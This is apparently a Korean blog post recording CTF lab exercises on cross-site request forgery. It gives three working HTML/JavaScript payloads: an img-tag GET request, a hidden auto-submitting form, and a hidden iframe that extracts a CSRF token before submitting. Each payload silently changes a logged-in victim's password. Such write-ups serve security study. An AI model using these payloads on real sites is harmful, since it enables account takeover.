---
title: "CSRF"
date: 2025-06-23
layout: single
toc: true
toc_label: "CSRF"
toc_icon: "book"
toc_sticky: true
tags: [web, xss, hacking]
header:
  teaser: /assets/images/csrf.png
---

# 개요

이 페이지는 웹 애플리케이션 내 Cross-Site Request Forgery (CSRF) 취약점을 이용하는 실습 기록입니다.

공격자의 관점으로 피해자의 브라우저를 통해 의도하지 않은 요청이 전송되도록 악성 요청을 구성하며, 이를 통해 계정 설정 변경, 비밀번호 변경 등의 동작을 수행할 수 있습니다.

---

# 실습 내용 정리

## CSRF 1

해당 기능은 사용자 정보를 변경하는 요청을 **HTTP GET 방식으로도 처리하고 있으며**, `CSRF Token`이나 `Referer` 검증 없이 파라미터만으로 사용자의 정보를 변경할 수 있어 외부 요청에 취약한 구조를 가진다.

![CSRF1 burp suite](/assets/screenshots/csrf/csrf1_burp_suite.png)

공격자는 게시판 기능을 이용해 다음과 같이 **사회공학적 미끼 제목**과 함께 CSRF 공격용 이미지를 삽입하였다.

**페이로드:**

```html
<img src="http://ctf.segfaulthub.com:7575/csrf_1/mypage_update.php?id=&info=&pw=1234">
```

![CSRF1 post](/assets/screenshots/csrf/csrf1_post.png)

 
사용자는 일반 게시글처럼 보여 클릭 유도

![CSRF1 list](/assets/screenshots/csrf/csrf1_list.png)

관리자가 로그인된 상태로 해당 게시글을 조회할 경우,  
**삽입된 이미지 태그를 통해 자동으로 GET 요청이 전송되며, 사용자의 비밀번호가 공격자가 지정한 값으로 변경된다**.

---

## CSRF 2

해당 기능은 POST 요청으로 사용자 정보를 변경하는 API를 제공하고 있으나, 서버는 `CSRF Token` 검증 또는 `Referer` 검증 없이 요청을 처리한다.

이로 인해 공격자가 외부 HTML 문서 내에 자동으로 전송되는 `form`을 작성할 경우, 피해자의 세션을 이용한 비밀번호 변경이 가능하다.

![CSRF2 burp suite](/assets/screenshots/csrf/csrf2_burp_suite.png)

요청 파라미터 중 `id` 값을 빈 문자열(`""`)로 설정하더라도,  
서버는 이를 별도 검증 없이 **현재 로그인된 사용자 세션 기준으로 자동 대체 처리**하는 구조를 가지고 있다.


![CSRF2 post](/assets/screenshots/csrf/csrf2_post.png)

**페이로드:**

```html
<iframe name="frame" sandbox="allow-forms allow-same-origin" style="display:none"></iframe>

<form action="http://ctf.segfaulthub.com:7575/csrf_2/mypage_update.php" method="POST" target="frame">
  <input type="hidden" name="id" value="">
  <input type="hidden" name="info" value="">
  <input type="hidden" name="pw" value="12345">
</form>

<script>
  document.forms[0].submit();
</script>
```

이로 인해 공격자는 사용자의 ID를 몰라도, 단순히 게시글을 열게 만드는 것만으로 **그 사용자의 비밀번호를 변경시킬 수 있으며**,

같은 게시글을 여러 사용자가 열 경우, 
**각각 자신의 계정 기준으로 비밀번호가 바뀌는 광범위한 피해가 발생할 수 있다.**

또한 공격자는 `<iframe>`에 `sandbox="allow-forms allow-same-origin"` 옵션을 설정함으로써,  
폼 전송은 허용하면서도 서버 응답 내 JavaScript(alert 등)를 실행하지 않도록 설정 한다.

따라서 피해자는 **회원 정보 수정에 성공하셨습니다!** 와 같은 안내 알림이 나타나지 않아,  
**비밀번호가 변경되었음에도 공격 사실을 인지하지 못한 채 CSRF 공격에 노출된다.**

---

## CSRF 3
 
해당 기능은 CSRF Token이 적용되어 있지만, `mypage.php` 페이지를 통해 토큰 값을 클라이언트에 노출시키는 구조이며, 서버는 전달된 토큰 값의 유효성만 검증한 뒤 사용자 정보를 수정한다.

공격자는 이를 악용하여 다음과 같이 **토큰 값을 사전에 iframe을 통해 추출 후**, 해당 값을 포함한 POST 요청을 자동으로 생성하여 사용자의 정보(비밀번호 등)를 변경할 수 있다.


![CSRF3 burp suite](/assets/screenshots/csrf/csrf3_burp_suite.png)

공격자는 다음과 같은 구조의 HTML을 게시글에 삽입하여, **사용자가 게시글을 열었을 때 자동으로 토큰 추출 → 정보 변경이 발생하도록 구성**한다.

**페이로드:**

```html
<iframe src="http://ctf.segfaulthub.com:7575/csrf_3/mypage.php?user=user101" id="frame1" style="display:none"></iframe>
<iframe name="frame2" sandbox="allow-forms allow-same-origin" style="display:none"></iframe>
<form action="http://ctf.segfaulthub.com:7575/csrf_3/mypage_update.php" method="POST" target="frame2" style="display:none">
<input name="id" value="">
<input name="info" value="">
<input name="pw" value="123">
<input name="csrf_token" value="">
</form>

<script>
    window.onload = function () {
        const html_frame = document.getElementById("frame1").contentWindow.document;
        const token = html_frame.querySelector('input[name="csrf_token"]').value;
        document.querySelector('input[name="csrf_token"]').value = token;
        document.forms[0].submit();
    }
</script>
```

![CSRF3 post](/assets/screenshots/csrf/csrf3_post.png)

공격자 페이지에는 시각적으로 아무 것도 표시되지 않으며,
`form`, `iframe` 모두 `display:none` 처리되어 사용자는 공격 사실을 인지할 수 없다.

- 클라이언트 측에서 CSRF Token이 노출되는 구조에서는, 공격자가 `iframe` 등을 이용해 이를 추출하고 자동 요청을 구성함으로써 **Token 기반 방어 로직 또한 우회할 수 있다.**